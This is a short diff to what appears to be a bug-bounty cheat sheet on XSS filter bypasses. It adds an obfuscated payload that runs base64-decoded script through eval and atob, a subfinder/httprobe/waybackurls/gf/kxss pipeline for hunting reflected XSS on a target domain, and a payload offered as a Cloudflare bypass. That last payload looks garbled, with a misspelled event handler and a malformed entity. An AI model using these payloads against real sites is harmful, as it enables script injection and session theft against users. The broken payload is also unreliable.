@@ -78,7 +78,21 @@ quotes => allowed
 onanything= => access denied
 / or \ or eval() => access denied
 ```
-**Bypass*
-
+**Bypass**
+```js
+"<>onauxclick<>=(eval)(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>+<sss
+```
+## Find Reflected XSS
+1. subfinder + httprobe
+```sh
+subfinder -d abc.com | httprobe -c 100 > target.txt
+cat target.txt | waybackurls | gf xss | kxss
+```
+2. Check the URL which have all the special characters unfiltered and the paramater was callback=
+3. Check Portswigger XSS CheatSheet for more information.
+## XSS Cloudflare Bypass
+```js
+<x/onpinterRawupdate=confirm%26Ipar;1)//x
+```
 
 
